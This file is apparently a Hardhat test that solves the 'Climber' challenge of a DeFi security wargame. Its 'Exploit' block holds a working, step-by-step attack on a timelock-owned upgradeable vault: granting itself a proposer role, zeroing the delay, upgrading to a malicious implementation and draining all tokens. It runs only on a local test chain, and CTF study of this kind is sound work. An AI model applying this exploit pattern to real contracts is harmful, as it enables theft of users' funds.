const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
        //The challenge consist of two contracts: a vault following the UUPS standard (proxy contract + implementation/logic contract) 
        //and a time-locker contract which is the owner of the previous one. Only the owner of the vault can upgrade the version of the implementation
        //so that is giving us a clue of the path to follow. Let's look the time-lock contract.
        
        //Essentially, this contract has a couple/three faults easy to avoid. First, its execute() function has no access control and open to be called externally.
        //Second, the same checks the status of the operation (Ready to be executed) after performing calls execution, and not before. This opens the door to do a series of 
        //malicious calls and aferwards schedule them to pass the requirement successfully. But there is a delay that is protecting from this one-transaction attack,
        //and a modifier also requesting us to be a proposer to call that schedule function.
        
        //Let's look more into detail. Third one is that the contract itself has admin role permissions, so combined with the previous two, we can call a func of the same contract 
        //to establish new roles for malicious addresses: a new proposer. Moreover, there's a function to set delay time with no access control as well, 
        //that requires to be called from the contract itself, which we saw it is factible via execute function. By setting a delay time to 0, we can 
        //finally complete the scheduling of the operation before the status is checked to be ReadyForExecution at the end of execute function.  

        //Combining all these ideas, we can build an attacker contract that will perform a series of calls: set a proposer to call schedule function afterwards,
        // modifiy the delay, update the vault implementation to be able to withdraw funds, and schedule all these in order to not roll-back all transactions.
        //Newer vault implementation only makes one function public so it can be exploited. 
        //Check ClimberVaultV2 and ClimberAttacker contracts. The script is also detailed to make it more clear. 

        // Deploy attacking contract and vault's new implementation/logic contract. 
        const attackerContractFactory = await ethers.getContractFactory("ClimberAttacker", attacker);
        const attackerContract = await attackerContractFactory.deploy(
            this.vault.address,
            this.timelock.address,
            this.token.address,
            attacker.address);

        const vaultV2Factory = await ethers.getContractFactory("ClimberVaultV2", attacker);
        const vaultV2 = await vaultV2Factory.deploy();

        
        //Build the arrays to exectute batched calls 
        targets = [];
        ethValues = [];
        dataElements = [];
        
        // Helper functions to return encoded data (function selector +  arguments) and to build arrays.
        const encodeFuncAndParameters = (ABI, signature, arguments) => {
            const iFace = new ethers.utils.Interface(ABI);
            const encodedData = iFace.encodeFunctionData(signature, arguments);
            return encodedData;
        }
        
        const arrayBuilder = ( address, value, data ) => {
            targets.push(address);
            ethValues.push(value);
            dataElements.push(data);
        }

        //Set a new proposer role: our attacker contract from where we will call timelock's schedule function.
        //Target: TimeLock contract, no value needed, encoded data to call grantRole from inherited AccessControl
        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
        let ABI = ["function grantRole(bytes32 role, address account)"];
        const roleData = encodeFuncAndParameters(ABI, "grantRole", [PROPOSER_ROLE, attackerContract.address]);
        arrayBuilder(this.timelock.address, 0 , roleData);

        //Modify delay to o to trick schedule function afterwards.
        //Target: TimeLock contract, no value needed, encoded data to call updateDelay
        ABI = ["function updateDelay(uint64 newDelay)"];
        const delayData = encodeFuncAndParameters(ABI, "updateDelay", [0]);
        arrayBuilder(this.timelock.address, 0 , delayData);

        //Update implementation/logic contract to VaultV2 (modified _setSweeper function)
        //Target: Vault contract, no value needed, encoded data to call upgradeTo
        ABI = ["function upgradeTo(address newImplementation)"];
        const upgradeData = encodeFuncAndParameters(ABI, "upgradeTo", [vaultV2.address]);
        arrayBuilder(this.vault.address, 0, upgradeData);

        //Call attacker contract to schedule batched calls and complete whole execution 
        //Target: Attacker contract, no value needed, encoded data to call setSchedule
        ABI = ["function setSchedule()"];
        const scheduleData = encodeFuncAndParameters(ABI, "setSchedule", "");
        arrayBuilder(attackerContract.address, 0, scheduleData);

        //Send batched calls to our attacker contract to trigger timelock's execute function.
        //These consecutive calls will end with the scheduling of the batch itself and completing 
        //all changes needed to perform the attack. 
        await attackerContract.setExecution(
            targets,
            ethValues,
            dataElements,
            ethers.utils.hexZeroPad(ethers.utils.hexlify(5),32)
        );
        
        //Set a new sweeper (attacker contract), withdraw all funds and transfer them to attacker's address 
        await attackerContract.setNewSweeper();
        await attackerContract.withdraw();
        console.log("Final attacker balance: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
